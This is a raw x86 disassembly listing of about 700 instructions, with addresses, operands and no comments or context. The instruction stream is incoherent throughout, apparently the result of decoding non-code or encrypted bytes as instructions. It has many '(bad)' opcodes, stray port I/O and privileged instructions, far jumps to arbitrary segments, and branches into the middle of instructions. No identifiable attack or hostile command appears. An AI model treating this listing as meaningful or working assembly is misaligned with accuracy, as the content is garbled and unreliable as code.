  40563a:	fistp  DWORD PTR [ebx-0x36]
  40563d:	fdiv   DWORD PTR [edi+0x2ae50ec6]
  405643:	test   DWORD PTR [edi+eiz*8+0x4e],esi
  405647:	cmp    eax,0xb6904c78
  40564c:	add    ebx,DWORD PTR [edi]
  40564e:	mov    bh,0x55
  405650:	pop    es
  405651:	pushf  
  405652:	or     al,0xcd
  405654:	cmp    dl,BYTE PTR [eax+0x130d0434]
  40565a:	shr    DWORD PTR [edx+eax*8],0x81
  40565e:	hlt    
  40565f:	mov    ch,BYTE PTR [esi]
  405661:	clc    
  405662:	pop    esp
  405663:	push   ss
  405664:	mov    ch,0x66
  405666:	in     al,0x94
  405668:	mov    es,WORD PTR [ecx+eiz*8+0x44ec885f]
  40566f:	stc    
  405670:	ss int 0xfe
  405673:	adc    eax,0x4ac5511a
  405678:	(bad)  
  405679:	sahf   
  40567a:	mov    bh,0xc1
  40567c:	jne    0x4056ab
  40567e:	xchg   DWORD PTR [ebp-0x65608bd6],eax
  405684:	xor    al,0xc9
  405686:	fsubp  st(1),st
  405688:	jp     0x405663
  40568a:	sub    BYTE PTR [ebx+0x1854c1b9],0x5a
  405691:	fmul   DWORD PTR [edi+0x30]
  405694:	addr16 dec ebp
  405696:	jne    0x40561e
  405698:	add    al,0x3
  40569a:	in     al,dx
  40569b:	cmp    esp,DWORD PTR [ebx]
  40569d:	cmp    DWORD PTR [esi+0x18c76221],ecx
  4056a3:	dec    esp
  4056a4:	pop    ebp
  4056a5:	je     0x40570d
  4056a7:	and    eax,0xa9b2418b
  4056ac:	xchg   BYTE PTR [edx],bh
  4056ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056af:	sahf   
  4056b0:	sub    eax,0x4160f6ed
  4056b5:	fimul  WORD PTR [eax]
  4056b7:	push   ds
  4056b8:	daa    
  4056b9:	adc    al,0xd0
  4056bb:	icebp  
  4056bc:	xchg   ebp,eax
  4056bd:	push   edx
  4056be:	mov    ah,0xfe
  4056c0:	sbb    ch,ah
  4056c2:	mov    eax,ds:0x20be93e6
  4056c7:	es sahf 
  4056c9:	rcl    BYTE PTR [ebp-0x63534fe4],cl
  4056cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056d0:	or     eax,0x2a2f244
  4056d5:	ins    BYTE PTR es:[edi],dx
  4056d6:	mov    bh,0xb4
  4056d8:	sub    al,ah
  4056da:	xor    BYTE PTR [esi],bl
  4056dc:	inc    ecx
  4056dd:	adc    esp,DWORD PTR [ecx+0x44]
  4056e0:	and    al,0xc8
  4056e2:	adc    al,cl
  4056e4:	inc    edx
  4056e5:	mov    DWORD PTR [esi],esi
  4056e7:	and    al,0xd0
  4056e9:	mov    ebp,0xcce12164
  4056ee:	dec    esp
  4056ef:	jb     0x4056fc
  4056f1:	in     eax,0x67
  4056f3:	mov    DWORD PTR [edx+0x72b81445],ecx
  4056f9:	scas   eax,DWORD PTR es:[edi]
  4056fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056fb:	jne    0x4056a1
  4056fd:	add    al,ah
  4056ff:	mov    ecx,0xf190301c
  405704:	lock mov gs,WORD PTR [edi-0x6e]
  405708:	xor    al,0xe2
  40570a:	mov    dh,dh
  40570c:	inc    ebp
  40570d:	out    0x80,al
  40570f:	mov    bl,0x2a
  405711:	and    bl,dl
  405713:	vpunpcklqdq ymm4,ymm6,YMMWORD PTR [edx+ecx*4]
  405718:	gs gs lahf 
  40571b:	test   bh,dl
  40571d:	sub    eax,0xcfcd6157
  405722:	push   edx
  405723:	(bad)  
  405724:	loope  0x405706
  405726:	push   eax
  405727:	rol    BYTE PTR [edx+0x7b],1
  40572a:	mov    DWORD PTR [ebp+0x72dab4],0xbebb09f9
  405734:	inc    DWORD PTR [ebp-0x56]
  405737:	pop    ebp
  405738:	mov    ah,0xd7
  40573a:	push   es
  40573b:	jl     0x40577f
  40573d:	and    BYTE PTR [edx],al
  40573f:	inc    DWORD PTR gs:[esi]
  405742:	lahf   
  405743:	aaa    
  405744:	sub    DWORD PTR [ebp-0x49],ebp
  405747:	fidiv  WORD PTR [ecx]
  405749:	push   ss
  40574a:	(bad)  
  40574b:	stc    
  40574c:	leave  
  40574d:	(bad)  
  40574e:	mul    DWORD PTR [eax]
  405750:	pop    ebx
  405751:	push   edx
  405752:	add    ebx,ebp
  405754:	sbb    ebx,edx
  405756:	xor    al,0x50
  405758:	xor    DWORD PTR [edi+0x5c],ecx
  40575b:	pop    edi
  40575c:	ds idiv edi
  40575f:	inc    esi
  405760:	mov    dl,0x1
  405762:	ins    BYTE PTR es:[edi],dx
  405763:	cwde   
  405764:	sbb    ebx,DWORD PTR [ecx-0x8]
  405767:	jbe    0x4057ae
  405769:	popf   
  40576a:	addr16 mov edi,0xbe2b2b62
  405770:	test   BYTE PTR [eax+0x3a],bh
  405773:	jmp    0x4057ed
  405775:	stos   BYTE PTR es:[edi],al
  405776:	stc    
  405777:	fisttp DWORD PTR [esi-0x375fa68b]
  40577d:	cmc    
  40577e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40577f:	out    0x50,al
  405781:	retf   
  405782:	dec    ebx
  405783:	sub    cl,BYTE PTR [edx-0x569134ad]
  405789:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40578a:	mov    ds:0x6e1b45ba,al
  40578f:	sbb    al,BYTE PTR [ebp-0x1c9c45d7]
  405795:	shl    DWORD PTR cs:[edi+eax*8-0x49],1
  40579a:	inc    esp
  40579b:	jg     0x405774
  40579d:	jl     0x40574c
  40579f:	test   BYTE PTR [edi-0x205a7528],ah
  4057a5:	dec    edx
  4057a6:	add    BYTE PTR [ebp-0x495d338c],0xbb
  4057ad:	push   esp
  4057ae:	sub    eax,0x7752b0c5
  4057b3:	shl    bh,0xdc
  4057b6:	les    edi,FWORD PTR [edx-0x326e815]
  4057bc:	xchg   eax,edx
  4057be:	adc    ebx,DWORD PTR [edx+0x78]
  4057c1:	sbb    DWORD PTR [edi-0x59a63307],esp
  4057c7:	sbb    BYTE PTR [ebp+0x56f8f203],0x90
  4057ce:	cmp    al,0xaa
  4057d0:	sbb    ah,BYTE PTR [ebx]
  4057d2:	rcr    BYTE PTR [edi-0x61],0xe1
  4057d6:	out    dx,eax
  4057d7:	xchg   BYTE PTR [esi+edi*4],dl
  4057da:	dec    ebp
  4057db:	scas   eax,DWORD PTR es:[edi]
  4057dc:	fisttp QWORD PTR [edi-0x37f5d2bc]
  4057e2:	loope  0x405767
  4057e4:	dec    ebp
  4057e5:	sub    DWORD PTR [ebx+0x17],ebp
  4057e8:	loope  0x405826
  4057ea:	loopne 0x4057f4
  4057ec:	test   esi,ebx
  4057ee:	mov    al,0x14
  4057f0:	pushf  
  4057f1:	add    ebp,DWORD PTR [ebp-0x22b65324]
  4057f7:	int    0xb2
  4057f9:	and    al,0xdd
  4057fb:	imul   esi,DWORD PTR [edi],0xf4264d78
  405801:	jbe    0x405880
  405803:	jmp    0x40579f
  405805:	repz sub BYTE PTR [edx-0x2819721b],cl
  40580c:	test   edi,edi
  40580e:	add    esp,DWORD PTR [edi]
  405810:	sbb    DWORD PTR [esi],edx
  405812:	dec    ecx
  405813:	int3   
  405814:	add    al,BYTE PTR [ecx-0x4a63a896]
  40581a:	push   ebx
  40581b:	push   ss
  40581c:	mov    edi,0xa6ec490e
  405821:	xchg   BYTE PTR [ebp+0x55a6a2fb],al
  405827:	mov    ds:0x5756bf43,al
  40582c:	xchg   edi,eax
  40582d:	shl    DWORD PTR [eax],0xf9
  405830:	push   ds
  405831:	pushf  
  405832:	cmc    
  405833:	or     DWORD PTR [eax-0x62],edx
  405836:	push   ebx
  405837:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405838:	repz jo 0x405802
  40583b:	int3   
  40583c:	sbb    ch,BYTE PTR [eax]
  40583e:	and    al,0x34
  405840:	jp     0x4058b8
  405842:	in     al,dx
  405843:	call   0xdc80:0xf78cddeb
  40584a:	out    dx,eax
  40584b:	es or  eax,0xac0f16a5
  405851:	xor    eax,ecx
  405853:	pop    esi
  405854:	test   eax,0xe34a71b
  405859:	dec    eax
  40585a:	xchg   ecx,eax
  40585b:	jecxz  0x40581c
  40585d:	arpl   WORD PTR [edx+0x11],di
  405860:	adc    DWORD PTR [ebp+0x20942984],ebp
  405866:	imul   DWORD PTR [ebx-0x53a49094]
  40586c:	sbb    edi,DWORD PTR [esi+ebx*2+0x2f3d9442]
  405873:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405874:	inc    edx
  405875:	mov    esi,0x470aa564
  40587a:	and    al,0xfd
  40587c:	xlat   BYTE PTR ds:[ebx]
  40587d:	jno    0x40585b
  40587f:	scas   eax,DWORD PTR es:[edi]
  405880:	das    
  405881:	sub    edi,DWORD PTR [eax]
  405883:	sbb    DWORD PTR [esi],edx
  405885:	pop    ebx
  405886:	jno    0x405810
  405888:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405889:	and    ah,bl
  40588b:	addr16 jmp 0x445b:0x25200922
  405893:	les    eax,FWORD PTR [eax-0x30]
  405896:	mov    edx,0x7628fd8f
  40589b:	adc    BYTE PTR [ebx],dh
  40589d:	out    0x7c,al
  40589f:	lds    esi,FWORD PTR [esi+0x53]
  4058a2:	test   eax,0x4e4082d0
  4058a7:	pop    esp
  4058a8:	cmp    ebp,edi
  4058aa:	lock pop ds
  4058ac:	pop    esi
  4058ad:	sbb    bh,dh
  4058af:	loop   0x405907
  4058b1:	bound  eax,QWORD PTR [esi-0x5]
  4058b4:	cmc    
  4058b5:	(bad)  [ebp-0x7]
  4058b8:	loop   0x40585e
  4058ba:	dec    DWORD PTR [edx+0x1ade3459]
  4058c0:	clc    
  4058c1:	mov    dl,0xcc
  4058c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058c4:	aam    0xf5
  4058c6:	push   esi
  4058c7:	cs in  al,dx
  4058c9:	xchg   ecx,eax
  4058ca:	call   0xc3be:0xc07501e
  4058d1:	mov    esp,0xfa4deeac
  4058d6:	inc    ecx
  4058d7:	(bad)  
  4058d8:	out    dx,eax
  4058d9:	mov    eax,0x817a5ad1
  4058de:	adc    dl,BYTE PTR [ebp+0x5f]
  4058e1:	(bad)  
  4058e2:	in     eax,dx
  4058e3:	icebp  
  4058e4:	mov    ebp,0x91aa8cc3
  4058e9:	mov    cl,0x91
  4058eb:	out    0x14,al
  4058ed:	fdivr  DWORD PTR [ebx-0x7c]
  4058f0:	stos   DWORD PTR es:[edi],eax
  4058f1:	xor    eax,0x44a45eec
  4058f6:	loope  0x40592e
  4058f8:	and    dh,0x65
  4058fb:	cwde   
  4058fc:	imul   esp,DWORD PTR [ebp-0x45],0xffffff92
  405900:	xchg   ebx,eax
  405901:	jmp    0x749a:0x1d1f6a23
  405908:	sti    
  405909:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40590a:	jmp    0xcbb0:0x458a89b8
  405911:	pop    es
  405912:	in     al,0x19
  405914:	adc    DWORD PTR [ecx-0x3eaa8eba],esi
  40591a:	adc    ebp,DWORD PTR [edx]
  40591c:	ss push esp
  40591e:	sub    esp,edx
  405920:	add    al,0x0
  405922:	ret    
  405923:	cwde   
  405924:	cwde   
  405925:	addr16 xchg ebx,eax
  405927:	xor    DWORD PTR [ebp-0x46],esp
  40592a:	pop    es
  40592b:	mov    dl,0x7a
  40592d:	xor    al,0x1f
  40592f:	add    ah,BYTE PTR [edi-0x127c4f1d]
  405935:	lods   eax,DWORD PTR ds:[esi]
  405936:	jecxz  0x4058d7
  405938:	sbb    DWORD PTR [edi-0x77105785],0x863dac54
  405942:	int3   
  405943:	dec    ecx
  405944:	pop    eax
  405945:	mov    bl,0x7d
  405947:	aaa    
  405948:	in     eax,dx
  405949:	(bad)  
  40594a:	mov    ds:0x12535fa5,al
  40594f:	out    0x2c,al
  405951:	xor    DWORD PTR [eax],ecx
  405953:	fimul  DWORD PTR [edi]
  405955:	fwait
  405956:	pop    edi
  405957:	push   0x18
  405959:	mov    bh,0x71
  40595b:	xchg   esi,eax
  40595c:	scas   al,BYTE PTR es:[edi]
  40595d:	pusha  
  40595e:	outs   dx,DWORD PTR ds:[esi]
  40595f:	arpl   dx,di
  405961:	adc    DWORD PTR [ecx],ebp
  405963:	fs repz or eax,0x1c09107c
  40596a:	and    al,0xa3
  40596c:	nop
  40596d:	gs mov bh,0xa
  405970:	cdq    
  405971:	pop    edx
  405972:	bound  ebp,QWORD PTR [ecx]
  405974:	lock call 0xdf6a9c43
  40597a:	mov    esi,0xca6d4255
  40597f:	or     ah,ah
  405981:	push   es
  405982:	sbb    BYTE PTR [edi-0x31],al
  405985:	int3   
  405986:	lods   eax,DWORD PTR ds:[esi]
  405987:	add    ebp,DWORD PTR [ecx+ebx*2+0x3f]
  40598b:	scas   al,BYTE PTR es:[edi]
  40598c:	pop    edi
  40598d:	jg     0x405912
  40598f:	dec    edi
  405990:	in     eax,0xbd
  405992:	popf   
  405993:	sub    ah,BYTE PTR [ecx+0x559f37d8]
  405999:	cmp    eax,DWORD PTR [eax-0x7ca674aa]
  40599f:	or     DWORD PTR [esi+0x1a],ebp
  4059a2:	mov    eax,0xc12256b
  4059a7:	dec    edx
  4059a8:	dec    edi
  4059a9:	mov    eax,0x2cbd0c8c
  4059ae:	pminsw mm5,QWORD PTR [ecx]
  4059b1:	popa   
  4059b2:	div    ah
  4059b4:	iret   
  4059b5:	jp     0x40595f
  4059b7:	cs mov dh,0x84
  4059ba:	mov    BYTE PTR [ebp-0x2c],dh
  4059bd:	mov    bh,BYTE PTR [ecx]
  4059bf:	push   esi
  4059c0:	sbb    bl,BYTE PTR [ebx+0x33cb9d03]
  4059c6:	push   ds
  4059c7:	ins    DWORD PTR es:[edi],dx
  4059c8:	push   0xfb59c7cf
  4059cd:	jl     0x4059b1
  4059cf:	pop    eax
  4059d0:	pop    ss
  4059d1:	push   0xffffff96
  4059d3:	add    al,0x3c
  4059d5:	test   BYTE PTR [eax],bh
  4059d7:	dec    eax
  4059d8:	jmp    0x4059e4
  4059da:	and    BYTE PTR [eax-0x52043cb7],dl
  4059e0:	fs icebp 
  4059e2:	push   ebx
  4059e3:	jp     0x405a5a
  4059e5:	stos   BYTE PTR es:[edi],al
  4059e6:	les    edx,FWORD PTR [edi]
  4059e8:	mov    esp,0xe749d763
  4059ed:	sub    al,0x4f
  4059ef:	xchg   edi,eax
  4059f0:	int3   
  4059f1:	or     eax,0x4940ec9f
  4059f6:	cmp    ah,BYTE PTR [edx-0xa]
  4059f9:	je     0x4059bd
  4059fb:	(bad)  
  4059fc:	jecxz  0x405983
  4059fe:	pop    es
  4059ff:	adc    ecx,DWORD PTR [esi-0x6a]
  405a02:	repz in eax,0xd1
  405a05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a06:	xchg   BYTE PTR [ecx],cl
  405a08:	add    DWORD PTR cs:[ebx+0x2b3ce24],eax
  405a0f:	(bad)  
  405a10:	inc    ecx
  405a11:	adc    eax,0xc00cebeb
  405a16:	cmp    BYTE PTR [eax-0x49f1ceb1],dl
  405a1c:	inc    edx
  405a1d:	or     esp,DWORD PTR [esi+ebx*1]
  405a20:	call   0x860c800b
  405a25:	mov    eax,0xc6af38b7
  405a2a:	fcomp  DWORD PTR [ecx+0x5c88cbd5]
  405a30:	sbb    eax,0xfcb5f693
  405a35:	imul   ebp,DWORD PTR [edx+ebx*8],0xffffff9c
  405a39:	sti    
  405a3a:	ja     0x405a78
  405a3c:	lahf   
  405a3d:	sti    
  405a3e:	sub    edi,DWORD PTR [edi-0x29764fea]
  405a44:	js     0x405a72
  405a46:	and    eax,0x14e6baaa
  405a4b:	shr    DWORD PTR ds:0x9494366d,cl
  405a51:	jmp    0x8ef4237d
  405a56:	hlt    
  405a57:	inc    eax
  405a58:	mov    bh,0xba
  405a5a:	pop    esp
  405a5b:	xor    eax,0xfa7439f3
  405a60:	mov    DWORD PTR [ecx],eax
  405a62:	jnp    0x405aca
  405a64:	and    BYTE PTR [ebx],bh
  405a66:	mov    edx,0x896d7959
  405a6b:	mov    al,BYTE PTR [ecx+edi*1-0x38]
  405a6f:	xrelease mov DWORD PTR [edi],esp
  405a72:	mov    eax,0x79fb752f
  405a77:	push   0x8f51f1ea
  405a7c:	test   eax,0xc0d905e8
  405a81:	(bad)  
  405a82:	(bad)  [ebp+0x21]
  405a85:	or     BYTE PTR [eax-0x2e3c9b0a],al
  405a8b:	out    dx,eax
  405a8c:	mov    WORD PTR [edx-0x2b],ds
  405a8f:	jae    0x405a99
  405a91:	push   esi
  405a92:	retf   0xa9a0
  405a95:	and    eax,0xdd2871f8
  405a9a:	jno    0x405b0d
  405a9c:	sbb    dl,ah
  405a9e:	xchg   ebp,eax
  405a9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405aa0:	ja     0x405afe
  405aa2:	mov    eax,0xb6a4b11d
  405aa7:	lods   eax,DWORD PTR ds:[esi]
  405aa8:	inc    ebx
  405aa9:	add    eax,0x59d41b69
  405aae:	jae    0x405ab2
  405ab0:	sub    al,0xf4
  405ab2:	ret    0xa801
  405ab5:	push   ds
  405ab6:	adc    al,cl
  405ab8:	icebp  
  405ab9:	jp     0x405b0b
  405abb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405abc:	xchg   BYTE PTR [esi],ch
  405abe:	sahf   
  405abf:	test   eax,0xe1997aa6
  405ac4:	lock sahf 
  405ac6:	int3   
  405ac7:	or     eax,0x84a9cd8b
  405acc:	mov    eax,0xe5762768
  405ad1:	(bad)  
  405ad2:	fimul  DWORD PTR ds:0x5b40abef
  405ad8:	leave  
  405ad9:	push   esi
  405ada:	(bad)  
  405adb:	bound  esi,QWORD PTR [eax+0x12a9daa6]
  405ae1:	inc    esi
  405ae2:	xor    edi,DWORD PTR [eax+0x22da2c23]
  405ae8:	xor    ch,0x32
  405aeb:	js     0x405b62
  405aed:	enter  0xc66,0xdd
  405af1:	cmp    eax,0x7a25ff6d
  405af6:	test   eax,0xd5e645a0
  405afb:	fwait
  405afc:	jne    0x405b20
  405afe:	lods   eax,DWORD PTR ds:[esi]
  405aff:	inc    eax
  405b00:	inc    edi
  405b01:	mov    edx,DWORD PTR [edx-0x7d]
  405b04:	xchg   DWORD PTR [ebx+0x6ef150c6],eax
  405b0a:	pop    eax
  405b0b:	adc    DWORD PTR [esi+0x4cc1e867],ebp
  405b11:	(bad)  
  405b12:	outs   dx,BYTE PTR ds:[esi]
  405b13:	push   ebp
  405b14:	retf   
  405b15:	and    eax,0x3fe3f04b
  405b1a:	sub    DWORD PTR [esi],0x2d161198
  405b20:	ins    BYTE PTR es:[edi],dx
  405b21:	shl    bh,1
  405b23:	dec    ebx
  405b24:	shr    bl,1
  405b26:	dec    esi
  405b27:	sbb    al,0x51
  405b29:	in     al,dx
  405b2a:	xchg   esp,eax
  405b2b:	push   esp
  405b2c:	mov    edx,0x4e27a99a
  405b31:	cmp    ecx,DWORD PTR [ebp-0x4f]
  405b34:	add    eax,0xd80f2ecf
  405b39:	xor    ebx,DWORD PTR [esi-0x51c3bfb3]
  405b3f:	jb     0x405b1e
  405b41:	mov    ds:0x362bdda8,eax
  405b46:	push   esp
  405b47:	and    eax,0xc9a1979
  405b4c:	inc    esi
  405b4d:	mov    dh,0x33
  405b4f:	in     al,0x85
  405b51:	leave  
  405b52:	ins    BYTE PTR es:[edi],dx
  405b53:	popf   
  405b54:	sub    al,0x2a
  405b56:	sbb    dh,dh
  405b58:	and    eax,0xa34de2f4
  405b5d:	lds    ecx,FWORD PTR [ebp+0x1e6394b3]
  405b63:	test   BYTE PTR ds:0xa17841ed,bl
  405b69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b6a:	inc    ecx
  405b6b:	outs   dx,BYTE PTR ds:[esi]
  405b6c:	cmp    eax,ebx
  405b6e:	icebp  
  405b6f:	fisub  DWORD PTR [edi+0x755296dd]
  405b75:	jns    0x405b94
  405b77:	sbb    al,bh
  405b79:	mov    ch,BYTE PTR ds:0x3ecbb2b
  405b7f:	les    edi,FWORD PTR [ebx+0x4d458d93]
  405b85:	fnstcw WORD PTR [edx-0x20]
  405b88:	loopne 0x405b3a
  405b8a:	adc    eax,0x4dc53f54
  405b8f:	jo     0x405bc3
  405b91:	jge    0x405b14
  405b93:	jae    0x405b87
  405b95:	repnz arpl WORD PTR [edx-0x4b],bx
  405b99:	xchg   esi,eax
  405b9a:	jmp    0x5f82:0x665c3267
  405ba1:	pop    es
  405ba2:	fcmovnu st,st(3)
  405ba4:	pop    esp
  405ba5:	dec    eax
  405ba6:	call   0x369a:0x4d920581
  405bad:	jecxz  0x405b73
  405baf:	mov    eax,ds:0x26d47b80
  405bb4:	add    esp,DWORD PTR [ecx-0x4804f3bd]
  405bba:	pop    esp
  405bbb:	retf   0x5ceb
  405bbe:	mov    ds:0x42f1113f,al
  405bc3:	and    eax,0xd35fb8dc
  405bc8:	pop    edi
  405bc9:	jmp    0x405c29
  405bcb:	mov    ds:0x3d0b774d,al
  405bd0:	cmp    DWORD PTR [edx+eiz*2+0x4f],edx
  405bd4:	nop
  405bd5:	fiadd  DWORD PTR [esp+eax*2-0x5b]
  405bd9:	mov    esp,DWORD PTR [ebx]
  405bdb:	xchg   BYTE PTR [edi-0x2d5bfe22],bl
  405be1:	das    
  405be2:	fbld   TBYTE PTR [edx-0x7a06c017]
  405be8:	pop    ds
  405be9:	ds aad 0x9e
  405bec:	inc    ebx
  405bed:	push   0xd
  405bef:	push   esi
  405bf0:	push   ss
  405bf1:	mov    ds:0x78015ac1,eax
  405bf6:	cmp    DWORD PTR [esi+0x3a1ad2d9],ebx
  405bfc:	in     eax,dx
  405bfd:	in     al,dx
  405bfe:	inc    edi
  405bff:	add    eax,0xc7eec3cf
  405c04:	pop    esi
  405c05:	or     eax,0xe0bdbf74
  405c0a:	shr    BYTE PTR [ecx+eax*1+0x3c],cl
  405c0e:	xchg   BYTE PTR [esi-0x67],ch
  405c11:	scas   eax,DWORD PTR es:[edi]
  405c12:	jl     0x405c68
  405c14:	dec    ecx
  405c15:	xor    BYTE PTR [edx+0x54e8f686],bh
  405c1b:	pop    ebp
  405c1c:	das    
  405c1d:	ror    BYTE PTR [ecx],1
  405c1f:	aam    0x94
  405c21:	push   esp
  405c22:	mov    ch,0x63
  405c24:	xchg   ebx,eax
  405c25:	popf   
  405c26:	pusha  
  405c27:	mov    ebx,0x1445565b
  405c2c:	mov    ch,0xfc
  405c2e:	jo     0x405c24
  405c30:	cs dec edi
  405c32:	(bad)  
  405c33:	or     ebx,ecx
  405c35:	xchg   ecx,eax
  405c36:	fcmovnu st,st(7)
  405c38:	std    
  405c39:	or     DWORD PTR [esi+ebx*4+0x299bad42],esi
  405c40:	imul   ebx,esi,0xffffffc0
  405c43:	add    ah,BYTE PTR [edx]
  405c45:	stos   BYTE PTR es:[edi],al
  405c46:	mov    DWORD PTR [ecx+0x25fa4894],esi
  405c4c:	pusha  
  405c4d:	scas   al,BYTE PTR es:[edi]
  405c4e:	adc    BYTE PTR ds:0xab8f086f,cl
  405c54:	rol    BYTE PTR [esi-0x73],0x8c
  405c58:	arpl   WORD PTR [edx+edx*8-0x7b1d8797],dx
  405c5f:	xor    ebp,edx
  405c61:	cmp    eax,DWORD PTR [edx+esi*1]
  405c64:	jno    0x405c7d
  405c66:	push   DWORD PTR [ebx+0x2486a876]
  405c6c:	inc    esi
  405c6d:	adc    ch,BYTE PTR [edx]
  405c6f:	cdq    
  405c70:	mov    cl,BYTE PTR [edx]
  405c72:	outs   dx,BYTE PTR ds:[esi]
  405c73:	push   edx
  405c74:	or     eax,DWORD PTR [edx+edx*1-0x291c550d]
  405c7b:	idiv   BYTE PTR [edx+edx*2+0x2a]
  405c7f:	or     ecx,DWORD PTR [edx+0x3476ebb5]
  405c85:	lea    esi,[edi]
  405c87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c88:	std    
  405c89:	or     ah,BYTE PTR [edx+0x5cbca33]
  405c8f:	mov    esp,0x49e47c9d
  405c94:	(bad)  
  405c95:	in     eax,0x9
  405c97:	sahf   
  405c98:	gs retf 0xd6b8
  405c9c:	mov    ebx,0x24ff144d
  405ca1:	mov    esi,0x6ef796b5
  405ca6:	inc    esi
  405ca7:	or     BYTE PTR [edx],cl
  405ca9:	mov    ds:0xcef5dd5,eax
  405cae:	push   cs
  405caf:	push   edi
  405cb0:	in     al,dx
  405cb1:	inc    edx
  405cb2:	enter  0x1eaf,0x4e
  405cb6:	sub    edx,eax
  405cb8:	dec    eax
  405cb9:	adc    eax,DWORD PTR ds:0xa334b506
  405cbf:	idiv   DWORD PTR [edx+ebx*4-0xc]
  405cc3:	mov    cl,0xed
  405cc5:	pop    esp
  405cc6:	adc    eax,0x365a4f8d
  405ccb:	ror    BYTE PTR [edi],0x36
  405cce:	nop
  405ccf:	jle    0x405d40
  405cd1:	retf   
  405cd2:	mov    ecx,0x5e36e954
  405cd7:	retfw  
  405cd9:	call   0x586a:0xda0811fa
  405ce0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ce1:	xchg   edi,eax
  405ce2:	xchg   esi,eax
  405ce3:	imul   ebp,eax,0x1
  405ce6:	aas    
  405ce7:	cmp    DWORD PTR [ebx+0x7f],edi
  405cea:	shr    BYTE PTR [ecx+0x11],1
  405ced:	mov    ebp,0x5e733841
  405cf2:	xor    dh,BYTE PTR [esi+0x5b]
  405cf5:	add    BYTE PTR [edx+edi*4+0x473eebbb],ch
  405cfc:	and    edi,DWORD PTR [edi]
  405cfe:	mov    edi,0xa5a872eb
  405d03:	adc    ah,BYTE PTR [ebp-0x6a8061a4]
  405d09:	inc    ebx
  405d0a:	xchg   DWORD PTR [esi],ebx
  405d0c:	xor    al,0xf0
  405d0e:	or     BYTE PTR [ebp-0x704a649b],cl
  405d14:	rol    DWORD PTR [ebp+0x34230ed1],0xad
  405d1b:	sbb    eax,0x8fb51677
  405d20:	aam    0x5a
  405d22:	or     ch,BYTE PTR [edx+eiz*8+0x5cfd73f5]
  405d29:	xchg   esi,eax
  405d2a:	cli    
  405d2b:	and    dh,dl
  405d2d:	jl     0x405cca
  405d2f:	jmp    0x405cc5
  405d31:	xchg   DWORD PTR [ebx+0x72812ab7],esp
  405d37:	or     eax,0x1a10956d
  405d3c:	outs   dx,BYTE PTR ds:[esi]
  405d3d:	mov    ch,0xb
  405d3f:	mov    edx,0x1d842f27
  405d44:	fbstp  TBYTE PTR [ecx+0x70]
  405d47:	inc    esi
  405d48:	jecxz  0x405cf2
  405d4a:	(bad)  
  405d4b:	add    edx,DWORD PTR [edi-0x7ceb3ab9]
  405d51:	ret    
  405d52:	jo     0x405db5
  405d54:	into   
  405d55:	push   0xe8f3e148
  405d5a:	mov    edi,0xb7b8a3e5
  405d5f:	push   edx
  405d60:	sbb    eax,0xcf309284
  405d65:	les    ebx,FWORD PTR [eax]
  405d67:	sbb    eax,0xfe7dad7c
  405d6c:	(bad)  
  405d6d:	pop    esi
  405d6e:	sahf   
  405d6f:	addr16 xchg ebx,eax
  405d71:	xor    al,0x13
  405d73:	aam    0x13
  405d75:	mov    edx,0xf417d793
  405d7a:	push   edi
  405d7b:	fcmovnu st,st(1)
  405d7d:	fcomp  QWORD PTR [eax+0x32]
  405d80:	push   es
  405d81:	ins    BYTE PTR es:[edi],dx
  405d82:	mov    ebx,0x501d67ea
  405d87:	jmp    0x4cf8:0x4dac2cf8
  405d8e:	mov    al,ds:0x90cc2bb
  405d93:	or     DWORD PTR ds:0xb473d1a,edx
  405d99:	pop    ebp
  405d9a:	test   BYTE PTR [edi],cl
  405d9c:	mov    al,ds:0xd88f6f3a
  405da1:	jns    0x405dda
  405da3:	mov    BYTE PTR [eax],bl
  405da5:	lods   al,BYTE PTR ds:[esi]
  405da6:	xor    esp,ebp
  405da8:	inc    edx
  405da9:	cld    
  405daa:	sub    al,0xa9
  405dac:	mov    esi,0xcff2d334
  405db1:	dec    esi
  405db2:	rcl    ebx,0x29
  405db5:	scas   al,BYTE PTR es:[edi]
  405db6:	ret    
  405db7:	ret    0xe7a4
  405dba:	into   
  405dbb:	sti    
  405dbc:	popa   
  405dbd:	mov    esi,esi
  405dbf:	fcom   QWORD PTR [esi-0x3b]
  405dc2:	stos   DWORD PTR es:[edi],eax
  405dc3:	retf   
  405dc4:	push   ss
  405dc5:	sti    
  405dc6:	inc    esi
  405dc7:	sbb    eax,0xd5c8e222
  405dcc:	outs   dx,DWORD PTR ds:[esi]
  405dcd:	in     al,dx
  405dce:	mov    BYTE PTR [ebx],ah
  405dd0:	pop    es
  405dd1:	mul    DWORD PTR [ebx]
  405dd3:	mov    esp,DWORD PTR [ebp-0x7c]
  405dd6:	cli    
  405dd7:	xchg   esp,eax
  405dd8:	inc    edx
  405dd9:	mov    al,ds:0x8cd55281
  405dde:	dec    eax
  405ddf:	jne    0x405dd2
  405de1:	in     eax,dx
  405de2:	mov    ds:0xfd305bc,al
  405de7:	push   edx
  405de8:	or     bh,0x5d
  405deb:	fnstenv [esi-0x9ca9470]
  405df1:	out    dx,al
  405df2:	dec    ebp
  405df3:	out    dx,al
  405df4:	or     ecx,DWORD PTR [eax-0x316ca93c]
  405dfa:	outs   dx,BYTE PTR ds:[esi]
  405dfb:	sub    ebx,edi
  405dfd:	daa    
  405dfe:	pop    esp
  405dff:	mov    edi,DWORD PTR [edi+0x14]
  405e02:	push   es
  405e03:	jns    0x405e25
  405e05:	nop
  405e06:	lahf   
  405e07:	adc    eax,0xf0f3ef14
  405e0c:	jns    0x405e6c
  405e0e:	xor    edi,DWORD PTR [ebx+edx*4+0x19a977fa]
